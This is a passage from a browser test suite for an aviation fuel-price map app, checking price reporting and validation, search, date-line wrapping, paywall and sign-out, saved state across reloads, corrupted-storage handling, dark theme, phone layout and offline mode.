      key($('mClose'), 'Tab', { shiftKey: true }); eq(document.activeElement, $('mSave'), 'Shift+Tab wraps to last');
      $('price').focus();
    });
    for (const bad of ['', '0', '0.00', '-5', '-0.5', 'abc', '50.01', '120', '$', '6.2.5', '0.001', '0x10', '1e1', 'Infinity']) {
      await test(`report: price ${JSON.stringify(bad)} is rejected`, async () => {
        if ($('modal').hidden) await openReport('KSMO');
        type($('price'), bad); $('mSave').click(); await sleep(150);
        assert(!$('modal').hidden, 'pop-up stays open');
        assert($('ferr').textContent.length > 0, 'error shown');
        assert(!/connection/.test($('ferr').textContent), 'error is about the number, not the connection: ' + $('ferr').textContent);
        eq(document.activeElement, $('price'), 'focus back on price');
        eq((await serverPrices()).length, 0, 'nothing saved');
      });
    }
    await test('report: Escape, Cancel, X and backdrop click close the pop-up; focus returns', async () => {
      key($('price'), 'Escape'); assert($('modal').hidden, 'Escape');
      assert(visible($('picked')), 'airport still picked');
      $('openPrice').focus(); $('openPrice').click(); await sleep(30); assert(!$('modal').hidden, 'reopened');
      $('mCancel').click(); assert($('modal').hidden, 'Cancel'); eq(document.activeElement, $('openPrice'), 'focus returned');
      $('openPrice').click(); $('mClose').click(); assert($('modal').hidden, 'X');
      $('openPrice').click(); $('modal').dispatchEvent(new MouseEvent('click', { bubbles: true })); assert($('modal').hidden, 'backdrop');
      $('openPrice').click(); $('priceForm').querySelector('h2').click(); assert(!$('modal').hidden, 'click inside keeps it open');
      key($('price'), 'Escape');
    });
    await test('report: "$6.25" (with dollar sign) as Jet A saves and shows "Saved"', async () => {
      $('openPrice').click(); await sleep(30);
      await submitPrice('JetA', '$6.25');
      assert($('modal').hidden, 'pop-up closed');
      assert(visible($('status')), 'status');
      has($('status').textContent, 'Saved. Jet A at $6.25/gal for SMO', 'status text');
      const p = (await serverPrices()).find(x => x.ident === 'KSMO' && x.fuel === 'JetA');
      assert(p && p.price === 6.25, 'server has KSMO Jet A 6.25');
      has($('recent').querySelector('li').textContent, '$6.25', 'latest reports');
      has($('picked').textContent, 'Jet A', 'picked card shows price');
    });
    await test('report: decimal comma "5,89" saves $5.89 (100LL)', async () => {
      $('openPrice').click(); await sleep(30);
      await submitPrice('100LL', '5,89');
      assert($('modal').hidden, 'saved (pop-up closed), error was: ' + $('ferr').textContent);
      const p = (await serverPrices()).find(x => x.ident === 'KSMO' && x.fuel === '100LL');
      assert(p && p.price === 5.89, 'server has 5.89');
    });
    await test('report: ID + Enter (no click) opens pop-up; more prices saved', async () => {
      for (const [id, fuel, price] of [['KLAX', '100LL', '7.10'], ['KVNY', '100LL', '6.80']]) {
        type($('apt'), id); $('aptForm').requestSubmit();
        await waitFor(() => !$('modal').hidden, 'modal for ' + id); await sleep(30);
        has($('mFor').textContent, id.slice(1), 'pop-up airport');
        await submitPrice(fuel, price); assert($('modal').hidden, 'saved ' + id + ': ' + $('ferr').textContent);
      }
      eq((await serverPrices()).length, 4, 'four prices on server');
    });
    await test('report: re-reporting the same airport + fuel replaces the price', async () => {
      await openReport('KSMO'); await submitPrice('JetA', '6.10');
      const list = (await serverPrices()).filter(x => x.ident === 'KSMO' && x.fuel === 'JetA');
      eq(list.length, 1, 'one record'); eq(list[0].price, 6.1, 'new price');
    });
    await test('report: server error -> clear message, button usable again, nothing lost', async () => {
      await ctl('postfail=1');
      try {
        await openReport('KSMO'); await submitPrice('MOGAS', '4.50');
        assert(!$('modal').hidden, 'pop-up stays open');
        has($('ferr').textContent, 'didn’t save', 'message');
        eq($('mSave').textContent, 'Add to map', 'button label'); assert(!$('mSave').disabled, 'button enabled');
        eq($('price').value, '4.50', 'typed price kept');
      } finally { await ctl('postfail=0'); }
      $('mSave').click(); await waitFor(() => $('modal').hidden, 'retry saves', 10000);
      assert((await serverPrices()).some(x => x.ident === 'KSMO' && x.fuel === 'MOGAS'), 'retry worked');
    });
    await test('report: "See it on the map" -> card + green price bubble', async () => {
      $('seeIt').click();
      await waitFor(() => !$('view-fuel').hidden && Q().selected === SMO, 'map with SMO');
      await settle();
      has($('card').querySelector('.fuelbox').textContent, '$6.10', 'card Jet A price');
      has($('card').querySelector('.fuelbox').textContent, '$5.89', 'card 100LL price');
      assert(Q().airportsShown, 'airports shown');
      eq(Q().priceHits.length >= 1, true, 'price bubble drawn');
      const b = Q().priceHits[0]; key(document.body, 'Escape'); await frames(2);
      eq(Q().priceHits.length, 0, 'bubble only for the selected airport');
      await tap(screenOf(SMO).x, screenOf(SMO).y); eq(Q().selected, SMO, 'reselect'); await frames(2);
      const h = Q().priceHits[0]; await tap((h[0] + h[2]) / 2, h[1] + 4);
      eq(Q().selected, SMO, 'clicking the bubble keeps its airport selected');
      void b;
    });
    await test('detail card "Report price" opens the pop-up on the report tab', async () => {
      $('cardReport').click();
      await waitFor(() => !$('modal').hidden && !$('view-report').hidden, 'report modal');
      has($('mFor').textContent, 'SMO', 'airport'); key($('price'), 'Escape');
      await go('fuel');
    });
    await test('finder after adding prices: ranked list, cheapest first, average', async () => {
      await setLocText('KSMO');
      setRange($('radius'), 100); $('fuelSeg').querySelector('[data-f=any]').click();
      const s = $('summary').textContent;
      has(s, '3 airports within 100 mi', 'count'); has(s, 'Cheapest is $4.50 at SMO', 'cheapest'); has(s, 'average $6.13', 'average');
      const rows = [...$('finderList').querySelectorAll('li[data-i]')];
      eq(rows.map(r => r.querySelector('.nm').textContent.slice(0, 3)).join(','), 'SMO,VNY,LAX', 'order');
      assert(rows[0].classList.contains('best'), 'best highlighted');
    });
    await test('finder: fuel filter and radius change the results', async () => {
      $('fuelSeg').querySelector('[data-f=JetA]').click();
      has($('summary').textContent, '1 airport within 100 mi. Cheapest is $6.10 at SMO', 'Jet A');
      $('fuelSeg').querySelector('[data-f=MOGAS]').click(); has($('summary').textContent, '1 airport', 'MOGAS');
      $('fuelSeg').querySelector('[data-f="100LL"]').click();
      setRange($('radius'), 10); has($('summary').textContent, '2 airports within 10 mi', 'radius 10 (SMO + LAX)');
      setRange($('radius'), 100); $('fuelSeg').querySelector('[data-f=any]').click();
    });
    await test('finder: click a result flies to it', async () => {
      $('finderList').querySelectorAll('li[data-i]')[2].click();
      eq(Q().NAME[Q().selected], 'Los Angeles International Airport', 'selected LAX'); await settle();
      has($('card').textContent, 'From search center', 'distance row');   // "From you" is kept for GPS locations
    });
    await test('finder: no prices in radius far away', async () => {
      await setLocText('0, 0'); setRange($('radius'), 500);
      has($('summary').textContent, 'No fuel prices reported within 500 mi', 'none');
      setRange($('radius'), 100);
    });
    await test('"Only airports with a reported fuel price" filter with prices', async () => {
      check($('fuelOnly'), true);
      type($('q'), 'Los Angeles');
      const rows = [...$('results').querySelectorAll('li[data-i]')];
      assert(rows.length >= 1, 'some results');
      assert(rows.every(r => r.querySelector('.pr').textContent.includes('$')), 'every result has a price');
      check($('fuelOnly'), false); key($('q'), 'Escape');
    });
    await test('another user\'s report shows up via the 30 s poll', async () => {
      const r = await fetch('/api/prices', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ident: 'NFNM', fuel: 'JetA', price: 4.44 }) });
      eq(r.status, 200, 'direct POST');
      await waitFor(() => Q().pricesByAirport.has(idx('NFNM')), 'poll to pick up price', 45000);
      await go('report'); has($('recent').textContent, 'TVU', 'latest reports'); await go('fuel');
    });

    // ---------- world wrap ----------
    const TVU = idx('NFNM'), RBI = idx('NFFR');
    await test('wrap: dragging east across 180° keeps the view continuous', async () => {
      await goto(-16.7, 179.7, 200);
      const v = Q().view, cx0 = v.cx, s = v.scale;
      await drag(900, 400, 300, 400);
      const want = ((cx0 + 600 / s) % 1 + 1) % 1;
      near(v.cx, want, 1e-9, 'cx'); assert(v.cx >= 0 && v.cx < 1, 'cx normalised');
      assert(v.cx * 360 - 180 < -170, 'now west of the date line');
      await drag(300, 400, 900, 400);
      near(v.cx, cx0, 1e-9, 'back west');
    });
    await test('wrap: arrow keys across the date line both ways', async () => {
      await goto(-16.7, 179.9, 150); canvas.focus();
      const v = Q().view, cx0 = v.cx;
      for (let k = 0; k < 10; k++) key(canvas, 'ArrowRight');
      assert(v.cx < 0.5, 'wrapped east'); for (let k = 0; k < 10; k++) key(canvas, 'ArrowLeft');
      near(v.cx, cx0, 1e-9, 'wrapped back');
    });
    await test('wrap: airports either side of 180° are drawn and clickable', async () => {
      await goto(-16.6, 180, 120);
      const a = screenOf(TVU), b = screenOf(RBI);
      assert(a.x > 0 && a.x < Q().W && b.x > 0 && b.x < Q().W, 'both on screen');
      assert(a.x > b.x, 'Matei (179.88°W) right of Rabi (179.98°E)');
      await tap(a.x, a.y); eq(Q().NAME[Q().selected], 'Matei Airport', `Matei (tap ${a.x.toFixed(1)},${a.y.toFixed(1)} view ${JSON.stringify(Q().view)} shown ${Q().airportsShown} sel ${Q().selected} pick ${Q().pickMode})`);
      await settle(); assert(Q().priceHits.length === 1, 'price bubble across seam');
      key(document.body, 'Escape');
      await tap(b.x, b.y); eq(Q().NAME[Q().selected], 'Rabi Island Airport', 'Rabi');
      key(document.body, 'Escape'); await frames(3);
      // symbols are really painted at both seam positions: compare pixels with the Small layer off
      const pa = patch(a.x, a.y), pb = patch(b.x, b.y);
      const small = $('filters').querySelectorAll('.chip')[2]; small.click(); await frames(3); await sleep(100);
      const qa2 = patch(a.x, a.y), qb2 = patch(b.x, b.y);
      small.click(); await frames(2);
      assert(pdiff(pa, qa2) > 500, 'Matei symbol painted (diff ' + pdiff(pa, qa2) + ')');
      assert(pdiff(pb, qb2) > 500, 'Rabi symbol painted (diff ' + pdiff(pb, qb2) + ')');
    });
    await test('wrap: finder radius reaches across 180°', async () => {
      await setLocText('-16.7, 179.95'); setRange($('radius'), 50);
      has($('summary').textContent, 'Cheapest is $4.44 at TVU', 'TVU found across the seam');
      setRange($('radius'), 100);
    });

    // ---------- sign out ----------
    await test('sign out: paywall returns, card closed, account removed', async () => {
      await tap(screenOf(TVU).x, screenOf(TVU).y);
      $('signOut').click(); await frames(2);
      assert(visible($('gate')), 'gate'); eq(gTitle(), 'Create your account', 'title');
      assert($('acct').hidden, 'account bar hidden'); assert($('card').hidden, 'card closed');
      eq(localStorage.getItem('ea.account'), null, 'storage'); eq(canvas.tabIndex, -1, 'canvas locked');
    });
    await test('sign out from the report tab, then visiting fuel shows the paywall', async () => {
      await signInProvider('github'); await payAndOpen();
      await go('report'); $('signOut').click(); assert($('acct').hidden, 'signed out');
      await go('fuel'); assert(visible($('gate')), 'gate');
    });
    await test('set up state for the reload test', async () => {
      await signInProvider('github'); await payAndOpen();
      await setLocText('KSMO'); setRange($('radius'), 250); $('fuelSeg').querySelector('[data-f=JetA]').click();
      const p = lsJSON('ea.finder'); eq(p.radius, 250, 'radius'); eq(p.fuel, 'JetA', 'fuel');
    });
    await test('airspace: Santa Monica is Class D, LAX is Class B', async () => {
      await go('fuel'); await ready(); await settle();  // the setup step's search-area zoom must finish first
      check($('planesOnMap'), false);                 // no plane can sit under the clicks below
      await waitFor(() => Q().airspace.loaded, 'airspace data');
      Q().view.cx = mxw(-118.45); Q().view.cy = myw(34.0); select_(idx('KSMO'));
      await waitFor(() => !$('card').hidden, 'card');
      has($('card').textContent, 'Class D, surface to 2,700 ft', 'SMO class');
      select_(idx('KLAX')); has($('card').textContent, 'Class B, surface to 10,000 ft', 'LAX class');
      select_(-1);
    });
    await test('airspace: clicking inside LA Class B (no airport there) shows it', async () => {
      if (Q().pickMode) $('pickMap').click();                  // a click in "pick on map" mode sets a location instead
      await goto(33.86, -118.55, 60);                          // over the water south-west of LAX, inside the Class B
      await tap(Q().W / 2, Q().H / 2);
      await waitFor(() => Q().selAirspace, 'airspace card (pickMode ' + Q().pickMode + ', selected ' + Q().selected + ', card ' + $('card').textContent.trim().slice(0, 60) + ')');
      has($('card').textContent, 'Class B', 'class B listed'); has($('card').textContent, 'Airspace here', 'kind');
      key(document, 'Escape'); await frames(2); assert($('card').hidden, 'Esc closes');
    });
    await test('airspace: switching Class airspace off removes it from clicks', async () => {
      await go('settings'); check($('airspaceOn'), false); await go('fuel'); await goto(33.86, -118.55, 60);
      await tap(Q().W / 2, Q().H / 2); await frames(2);
      assert(!Q().selAirspace || !Q().selAirspace.some(x => x.kind === 'cls'), 'no class airspace when off');
      select_(-1); await go('settings'); check($('airspaceOn'), true); await go('fuel');
    });
    await test('restricted airspace: China Lake shows a restricted area', async () => {
      await goto(35.7, -117.6, 120); await tap(Q().W / 2, Q().H / 2);
      await waitFor(() => Q().selAirspace, 'airspace card');
      has($('card').textContent, 'Restricted area', 'restricted');
      key(document, 'Escape');
    });
    await test('planes: on by default, drawn when zoomed in, hover and click show details', async () => {
      eq(lsJSON('ea.settings').planes, false, 'switched off by the airspace tests'); check($('planesOnMap'), true);
      await goto(40.7, -74.0, 300);
      await waitFor(() => Q().planeHits.length >= 8, 'test planes drawn', 20000);
      const h = Q().planeHits.find(x => x[2].cs === 'TST001'); assert(h, 'TST001 on screen');
      ptr('pointermove', h[0], h[1]); await frames(2);
      has($('tip').textContent, 'TST001', 'tooltip callsign'); has($('tip').textContent, 'B738', 'tooltip type');
      await tap(h[0], h[1]);
      await waitFor(() => Q().selPlane && Q().selPlane.cs === 'TST001', 'plane selected');
      has($('card').textContent, 'Live plane · Airliners', 'card kind'); has($('card').textContent, 'Track on adsb.lol', 'link');
      key(document, 'Escape');
    });
    await test('planes: type filters hide groups; the switch turns them all off', async () => {
      await go('settings');
      const box = document.querySelector('#planeTypes input[data-pt="0"]');
      check(box, false); await go('fuel'); await sleep(1200); await frames(2);
      assert(!Q().planeHits.some(x => x[2].g === 0), 'no airliners'); assert(Q().planeHits.length > 0, 'others still shown');
      await go('settings'); check(box, true); check($('planesOn'), false); await go('fuel'); await frames(3);
      eq(Q().planeHits.length, 0, 'planes off'); eq($('planesOnMap').checked, false, 'map layers switch follows');
      await go('settings'); check($('planesOn'), true); await go('fuel');
    });
    await test('recents: opened airports and searches appear under an empty search box', async () => {
      $('histClear').click();
      type($('q'), 'santa monica'); await waitFor(() => $('results').querySelector('li[data-i]'), 'results');
      key($('q'), 'Enter'); await settle();
      type($('q'), ''); $('q').dispatchEvent(new Event('focus')); await frames(2);
      assert(visible($('results')), 'recent list open'); has($('results').textContent, 'Recent', 'heading');
      has($('results').textContent, 'Santa Monica Municipal Airport', 'airport'); has($('results').textContent, 'santa monica', 'search');
      $('results').querySelector('[data-clear-history]').click(); await frames(2);
      eq(Q().recents.length, 0, 'cleared'); select_(-1);
    });
    await test('remember the view to reopen', async () => {
      await go('fuel'); await goto(37.62, -122.38, 120); select_(idx('KSFO')); await sleep(800);
      eq(lsJSON('ea.state').sel, 'KSFO', 'selection saved'); eq(lsJSON('ea.state').tab, 'fuel', 'tab saved');
    });
    history.replaceState(null, '', location.pathname + location.search);   // reopen without a #tab, like a fresh launch
    next('B');
  },

  async B() {
    await test('reload: reopens the map where it was, with the same airport open', async () => {
      await ready(); await waitFor(() => Q().selected >= 0, 'selection restored', 15000);
      eq(Q().currentTab, 'fuel', 'tab'); eq(Q().IDENT[Q().selected], 'KSFO', 'airport');
      near(Q().view.cx, mxw(-122.38), 0.01, 'map position x'); near(Q().view.cy, myw(37.62), 0.01, 'map position y');
    });
    await test('reload: account persists and the map stays unlocked', async () => {
      await go('fuel');
      assert($('gate').hidden, 'no gate'); eq($('acctName').textContent, 'GitHub test pilot', 'name');
      eq($('acctPlan').textContent, 'Find Fuel unlocked · test', 'plan');
    });
    await test('reload: finder prefs persist (location, radius, fuel)', async () => {
      eq($('radius').value, '250', 'slider'); eq($('radOut').textContent, '250 mi', 'label');
      eq($('fuelSeg').querySelector('[aria-pressed=true]').dataset.f, 'JetA', 'fuel');
      await ready(); await waitFor(() => !$('locChip').hidden, 'location chip');
      eq($('locLabel').textContent, 'SMO · Santa Monica Municipal Airport', 'location');
      await waitFor(() => $('summary').textContent.includes('Cheapest'), 'summary with prices', 15000);
      has($('summary').textContent, 'Cheapest is $6.10 at SMO', 'summary');
    });
    await test('reload: reported prices persist on the server', async () => {
      await go('report'); has($('recent').textContent, 'SMO', 'recent'); has($('recent').textContent, 'TVU', 'recent TVU');
    });
    localStorage.setItem('ea.finder', '{bad json');
    localStorage.setItem('ea.account', '{"provider":"evil","name":1,"paid":true}');
    next('C');
  },

  async C() {
    await test('corrupt localStorage: page boots, falls back to defaults, paywall shown', async () => {
      await ready(); await go('fuel');
      assert(visible($('gate')), 'gate (bad account ignored)'); eq($('radOut').textContent, '100 mi', 'default radius');
      assert($('locChip').hidden, 'no location');
    });
    localStorage.setItem('ea.finder', JSON.stringify({ loc: { lat: 95, lon: 500 }, radius: 'abc', fuel: 'DIESEL' }));
    localStorage.setItem('ea.account', JSON.stringify({ provider: 'github', name: 'X', paid: true }));
    next('D');
  },

  async D() {
    await test('tampered prefs (lat 95, lon 500, bad radius/fuel) are ignored', async () => {
      await ready(); await go('fuel'); await frames(3);
      assert($('locChip').hidden, 'bad location not used (label: ' + $('locLabel').textContent + ')');
      eq($('radOut').textContent, '100 mi', 'radius default');
      eq($('fuelSeg').querySelector('[aria-pressed=true]').dataset.f, 'any', 'fuel default');
    });
    await done();
  },
};

suites.dark = {
  async A() {
    localStorage.setItem('ea.account', JSON.stringify({ provider: 'apple', name: 'Night Flyer', paid: false }));
    next('B');
  },
  async B() {
    await test('dark theme: system dark scheme detected, page background dark', async () => {
      assert(matchMedia('(prefers-color-scheme: dark)').matches, 'prefers dark');
      assert(lum(getComputedStyle(document.body).backgroundColor) < 0.3, 'body bg ' + getComputedStyle(document.body).backgroundColor);
    });
    await test('dark theme: paywall card readable (light text on dark card)', async () => {
      await go('fuel'); await waitFor(() => visible($('gate')), 'gate');
      eq(gTitle(), 'Unlock Find Fuel', 'pay step for saved unpaid account');
      const t = getComputedStyle($('gTitle')).color; assert(lum(t) > 0.6, 'title colour ' + t);
      await payAndOpen();
    });
    await test('dark theme: map paints with the dark palette', async () => {
      await ready(); await goto(0, -150, 3000);
      const L = pixLum(Q().W / 2, Q().H / 2); assert(L < 0.35, 'ocean luminance ' + L.toFixed(2));
      const r = getComputedStyle(document.querySelector('.finder')); assert(lum(r.color) > 0.6, 'rail text ' + r.color);
    });
    await test('theme switch at runtime (data-theme=light) repaints the map', async () => {
      document.documentElement.dataset.theme = 'light'; await frames(4); await sleep(100);
      const L = pixLum(Q().W / 2, Q().H / 2); assert(L > 0.5, 'light ocean luminance ' + L.toFixed(2));
      document.documentElement.dataset.theme = 'dark'; await frames(4); await sleep(100);
      assert(pixLum(Q().W / 2, Q().H / 2) < 0.35, 'dark again');
      delete document.documentElement.dataset.theme;
    });
    await test('dark theme: price pop-up readable', async () => {
      await openReport('KSMO');
      const sheet = getComputedStyle(document.querySelector('.sheet'));
      assert(lum(sheet.backgroundColor) < 0.4, 'sheet bg ' + sheet.backgroundColor);
      assert(lum(getComputedStyle($('mTitle')).color) > 0.6, 'sheet title');
      key($('price'), 'Escape');
    });
    await done();
  },
};

suites.phone = {
  async A() {
    await test('phone: viewport is 390 CSS px wide', async () => {
      eq(innerWidth, 390, 'innerWidth'); assert(innerHeight > 700, 'innerHeight ' + innerHeight);
    });
    await test('phone: no sideways scrolling on download', async () => { await go('download'); assert(noHScroll(), 'scrollWidth ' + document.documentElement.scrollWidth); });
    await test('phone: no sideways scrolling on settings', async () => { await go('settings'); assert(noHScroll(), 'scrollWidth ' + document.documentElement.scrollWidth); });
    await test('phone: paywall fits the screen and is usable', async () => {
      await go('fuel'); await waitFor(() => visible($('gate')), 'gate');
      assert(noHScroll(), 'no sideways scroll, scrollWidth ' + document.documentElement.scrollWidth);
      const r = document.querySelector('.gcard').getBoundingClientRect();
      assert(r.left >= 0 && r.right <= innerWidth + 0.5, `card inside screen (${r.left.toFixed(0)}..${r.right.toFixed(0)})`);
      const b = document.querySelector('#gate [data-act=provider]').getBoundingClientRect();
      assert(b.width >= 200 && b.height >= 40, 'provider button size ' + b.width.toFixed(0) + 'x' + b.height.toFixed(0));
      type($('gName'), 'Phone Pilot'); type($('gEmail'), 'phone@example.com'); $('emailForm').requestSubmit();
      eq(gTitle(), 'Unlock Find Fuel', 'pay step');
      const pay = $('gate').querySelector('[data-act=pay]');
      pay.scrollIntoView(); assert(visible(pay), 'pay button reachable');
      await payAndOpen();
    });
    await test('phone: map fills the screen at device pixel ratio 2', async () => {
      await ready(); assert(noHScroll(), 'no sideways scroll');
      eq(devicePixelRatio, 2, 'devicePixelRatio'); eq(Q().W, canvas.clientWidth, 'W');
      eq(canvas.width, Q().W * Q().DPR, 'backing store matches DPR (2, or 1 if the page fell back to lite mode)');
    });
    await test('phone: touch pinch zoom + touch drag', async () => {
      await goto(34.0158, -118.451, 2000);
      const v = Q().view, s0 = v.scale, cx = Q().W / 2, cy = Q().H / 2;
      ptr('pointerdown', cx - 60, cy, 1, 'touch'); ptr('pointerdown', cx + 60, cy, 2, 'touch');
      for (let k = 1; k <= 6; k++) { ptr('pointermove', cx - 60 - 10 * k, cy, 1, 'touch'); ptr('pointermove', cx + 60 + 10 * k, cy, 2, 'touch'); await frames(1); }
      ptr('pointerup', cx - 120, cy, 1, 'touch'); ptr('pointerup', cx + 120, cy, 2, 'touch');
      assert(v.scale / s0 > 1.7, 'pinch ratio ' + (v.scale / s0).toFixed(2));
    });
    await test('phone: tap an airport, card fits on screen', async () => {
      await goto(34.0158, -118.451, 40);
      const p = screenOf(idx('KSMO')); await tap(p.x, p.y, 'touch');
      assert(visible($('card')), 'card'); const r = $('card').getBoundingClientRect();
      assert(r.left >= 0 && r.right <= innerWidth + 0.5, `card inside screen (${r.left.toFixed(0)}..${r.right.toFixed(0)})`);
      assert(r.bottom <= innerHeight + 0.5, 'card bottom ' + r.bottom.toFixed(0));
      key(document.body, 'Escape');
    });
    await test('phone: search works', async () => {
      type($('q'), 'KSMO'); key($('q'), 'Enter'); eq(Q().selected, idx('KSMO'), 'selected'); await settle(); key(document.body, 'Escape');
    });
    await test('phone: Use my location when permission is denied shows a helpful message', async () => {
      $('useGeo').click();
      await waitFor(() => /wasn’t shared/.test($('summary').textContent), 'denied message', 20000);
      assert(!$('useGeo').disabled, 'button re-enabled'); has($('useGeo').textContent, 'Use my location', 'label restored');
    });
    await test('phone: report a price; pop-up fits the screen', async () => {
      await go('report'); assert(noHScroll(), 'report no sideways scroll');
      await openReport('KSMO');
      await sleep(300);   // let the open animation finish
      const r = document.querySelector('.sheet').getBoundingClientRect();
      assert(r.left >= 0 && r.right <= innerWidth + 0.5 && r.top >= 0 && r.bottom <= innerHeight + 0.5,
        `sheet inside screen (x ${r.left.toFixed(0)}..${r.right.toFixed(0)}, y ${r.top.toFixed(0)}..${r.bottom.toFixed(0)}, viewport ${innerWidth}x${innerHeight}; ` +
        `grid track ${getComputedStyle($('modal')).gridTemplateColumns}; widest parts: ` +
        [...document.querySelectorAll('.sheet *')].map(e => [e.id || e.className || e.tagName, e.scrollWidth]).sort((x, y) => y[1] - x[1]).slice(0, 4).map(x => x.join('=')).join(', ') + ')');
      await submitPrice('100LL', '6.25'); assert($('modal').hidden, 'saved: ' + $('ferr').textContent);
      has($('status').textContent, 'Saved.', 'status');
      assert(noHScroll(), 'no sideways scroll after save');
    });
    await done();
  },
};

suites.noapi = {
  async A() {
    await test('no price server: read-only state shown', async () => {
      await ready(); eq($('liveState').textContent, 'Prices offline', 'live state'); eq(Q().store.mode, 'none', 'mode');
    });
    await test('no price server: pop-up explains it can\'t save; Save keeps it open', async () => {
      await openReport('KSMO');
      has($('ferr').textContent, 'can’t be saved', 'message on open');
      type($('price'), '6.00'); $('mSave').click(); await waitFor(() => !$('mSave').disabled, 'save attempt');
      assert(!$('modal').hidden, 'stays open'); has($('ferr').textContent, 'can’t be saved', 'message after save');
      key($('price'), 'Escape');
      has($('recent').textContent, 'No reports yet', 'empty latest reports');
    });
    await done();
  },
};

(async () => {
  try {
    const s = suites[SUITE]; if (!s || !s[PHASE]) throw new Error('no suite/phase ' + SUITE + '/' + PHASE);
    await waitFor(() => Q(), 'test hook');
    await s[PHASE]();
  } catch (e) {
    await post({ suite: SUITE, phase: PHASE, name: 'FATAL', ok: false, msg: String(e && e.stack || e) });
    await done();
  }
})();
})();
